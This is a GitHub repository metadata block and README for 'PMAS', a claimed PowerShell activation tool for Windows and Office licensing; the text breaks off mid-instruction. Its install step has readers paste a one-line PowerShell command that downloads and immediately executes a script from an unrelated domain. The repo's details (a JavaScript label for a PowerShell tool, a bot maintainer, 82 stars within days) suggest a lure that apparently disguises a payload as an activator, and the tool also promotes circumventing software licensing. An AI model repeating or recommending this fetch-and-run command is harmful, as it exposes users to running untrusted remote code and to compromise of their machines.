---
repo: "adailjunior-sys/pmas-automation-script"
name: "pmas-automation-script"
description: "PMAS - PowerShell Multi setup System with TSF, HWID, OHOOK and KMS methods"
readmeQualityOk: true
url: "https://github.com/adailjunior-sys/pmas-automation-script"
language: "JavaScript"
languages: ["JavaScript"]
languagePcts: [100]
topics: ["activator", "hwid", "kms", "kms-office", "kms38", "kms4k", "microsoft", "office", "office365", "ohook"]
stars: 82
forks: 0
openIssues: 0
closedIssues: 0
watchers: 0
contributors: 1
recentReleases: 0
createdAt: "2026-10-29T15:51:56Z"
lastCommitAt: "2026-10-31T15:58:29Z"
status: "thriving"
tags: []
healthScore: 80
undervaluedScore: 18
maintainers: ["github-actions[bot]", "adailjunior-sys"]
openGraphImageUrl: "https://opengraph.githubassets.com/3826af1ff86a57ec38844dde517aad4c680d523f2364de36d0e78ffd063b71e8/adailjunior-sys/pmas-automation-script"
---

# PMAS PowerShell Multi Activation System — Auto Script

---

PMAS is a PowerShell-based multi-activation system that bundles TSF, HWID, Ohook, and KMS Inject methods into a single script for Windows and Office licensing. It runs its TSF library directly from memory, checks for connectivity, and falls back to offline KMS licensing when needed, so the same menu handles both online and air-gapped scenarios. Older systems such as Windows 7 and 8.1 are routed automatically to the KMS path, while Windows 10 and 11 expose the full set of activation, removal, and status-check options. The script also supports $OEM$ folder generation for pre-install activation and verifies its own integrity via SHA256 before running.

## 🚀 PowerShell Install Guide

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the install command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Windows blocking the script? Use CMD
Paste this…
